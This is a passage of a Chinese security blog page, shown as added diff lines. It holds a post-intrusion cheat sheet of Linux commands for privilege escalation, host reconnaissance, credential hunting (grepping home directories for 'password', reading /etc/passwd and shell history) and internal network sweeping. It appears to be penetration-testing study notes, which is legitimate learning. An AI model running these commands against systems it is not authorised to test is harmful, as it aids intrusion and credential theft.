+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;doamin controllers&#34;</span> /domain  # 查看域控制器主机名（可能有多台）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">网络联通：
+</span></span><span class="line"><span class="cl">ping 主机名.域后缀
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="linux主机">Linux主机
+</h2><p>跟上面一样，进行一个基本的记录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">提权：
+</span></span><span class="line"><span class="cl">sudo -l               <span class="c1"># 有密码可尝试root登录</span>
+</span></span><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null  <span class="c1"># 查找SUID权限文件（高危提权点）</span>
+</span></span><span class="line"><span class="cl">cat /etc/sudoers      <span class="c1"># 查看sudo配置（有权限的话）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">主机信息：
+</span></span><span class="line"><span class="cl">uname -a              <span class="c1"># 内核、系统、架构</span>
+</span></span><span class="line"><span class="cl">hostname              <span class="c1"># 主机名</span>
+</span></span><span class="line"><span class="cl">id                    <span class="c1"># 当前用户、权限</span>
+</span></span><span class="line"><span class="cl">whoami                <span class="c1"># 当前用户名</span>
+</span></span><span class="line"><span class="cl">ip a                  <span class="c1"># IP、网卡、MAC（对应 ipconfig）</span>
+</span></span><span class="line"><span class="cl">ip addr               <span class="c1"># 同上</span>
+</span></span><span class="line"><span class="cl">cat /etc/resolv.conf  <span class="c1"># DNS、域后缀（超级关键）</span>
+</span></span><span class="line"><span class="cl">route -n              <span class="c1"># 路由表（对应 route print）</span>
+</span></span><span class="line"><span class="cl">arp -a                <span class="c1"># ARP 缓存（内网存活主机）</span>
+</span></span><span class="line"><span class="cl">netstat -tulnp        <span class="c1"># 端口监听（对应 netstat -ano）</span>
+</span></span><span class="line"><span class="cl">ps aux                <span class="c1"># 进程（对应 tasklist）</span>
+</span></span><span class="line"><span class="cl">cat /etc/passwd       <span class="c1"># 所有用户</span>
+</span></span><span class="line"><span class="cl">cat /etc/group        <span class="c1"># 所有组</span>
+</span></span><span class="line"><span class="cl">cat /etc/crontab      <span class="c1"># 计划任务（对应 schtasks）</span>
+</span></span><span class="line"><span class="cl">ls -al /home          <span class="c1"># 查看用户家目录</span>
+</span></span><span class="line"><span class="cl"><span class="nb">history</span>               <span class="c1"># 历史命令（常泄露密码）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">渗透目标：
+</span></span><span class="line"><span class="cl">cat /etc/hosts        <span class="c1"># 本地主机映射（常藏内网机器）</span>
+</span></span><span class="line"><span class="cl">cat /etc/resolv.conf  <span class="c1"># 查看域、DNS服务器</span>
+</span></span><span class="line"><span class="cl">arp -a                <span class="c1"># 内网存活主机（最常用）</span>
+</span></span><span class="line"><span class="cl">ip neigh              <span class="c1"># 新版ARP查看</span>
+</span></span><span class="line"><span class="cl">cat /proc/net/fib_trie  <span class="c1"># 内网网段信息</span>
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;password&#34;</span> /home 2&gt;/dev/null  <span class="c1"># 搜索密码</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;*.conf&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep -E <span class="s2">&#34;(mysql|redis|config|php)&#34;</span>  <span class="c1"># 找配置文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">网络连通：
+</span></span><span class="line"><span class="cl">ping -c <span class="m">2</span> 192.168.1.1       <span class="c1">#  ping 测试</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> ping -c <span class="m">1</span> 192.168.1.<span class="nv">$i</span> <span class="p">|</span> grep <span class="s2">&#34;64 bytes&#34;</span> <span class="p">&amp;</span> <span class="k">done</span>  <span class="c1"># 一键扫内网存活</span>
+</span></span><span class="line"><span class="cl">nmap -sn 192.168.1.0/24     <span class="c1"># 存活扫描（有nmap时）</span>
+</span></span><span class="line"><span class="cl">ping 主机名             <span class="c1"># ping 主机名</span>
+</span></span><span class="line"><span class="cl">ping 主机名.域          <span class="c1"># ping 主机名.域（如 ping dc01.test.local）</span>
+</span></span><span class="line"><span class="cl">ping -c <span class="m">2</span> IP           <span class="c1"># ping 2次就停</span>
+</span></span><span class="line"><span class="cl">curl http://IP         <span class="c1"># 测试80端口连通</span>
+</span></span><span class="line"><span class="cl">telnet IP 端口         <span class="c1"># 测试端口连通</span>
+</span></span><span class="line"><span class="cl">nc -zv IP 端口         <span class="c1"># 端口探测（神器）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.3.png" loading="lazy" data-key="" data-hash="/images/hongri/Attack1/靶场1.3.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">红日靶机练习(第一章)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/CTF/so/so1.png" loading="lazy" data-key="" data-hash="/images/CTF/so/so1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">恶意so加载(花活)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/serialize/serialize1.png" loading="lazy" data-key="" data-hash="/images/TOP10/serialize/serialize1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP反序列化整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/rce%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/RCE/rce1.png" loading="lazy" data-key="" data-hash="/images/TOP10/RCE/rce1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssti%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/TOP10/SSTI/ssti1.png" loading="lazy" data-key="" data-hash="/images/TOP10/SSTI/ssti1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSTI整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 xxxx
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
